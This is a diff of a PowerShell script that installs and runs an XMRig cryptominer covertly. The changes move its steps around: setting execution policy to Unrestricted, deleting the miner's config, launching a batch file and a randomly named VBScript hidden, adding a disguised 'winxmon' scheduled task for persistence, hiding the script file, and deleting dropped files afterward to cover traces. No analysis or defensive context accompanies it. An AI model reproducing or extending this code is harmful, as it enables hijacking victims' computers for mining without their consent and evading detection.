@@ -117,13 +117,6 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 #Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden
 
-Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-cd "$initial_dir\xmrig-6.22.2"
-Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
-Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
-
-& "./TMqhONoBljEv.vbs"
-
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
 
 $TaskName = "winxmon"
@@ -136,10 +129,17 @@ $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName 
 
 Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden
 
-Start-Sleep -Seconds 200
-
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
-Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
+
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+cd "$initial_dir\xmrig-6.22.2"
+Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
+Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
+
+& "./TMqhONoBljEv.vbs"
+
+Start-Sleep -Seconds 200
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
+Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
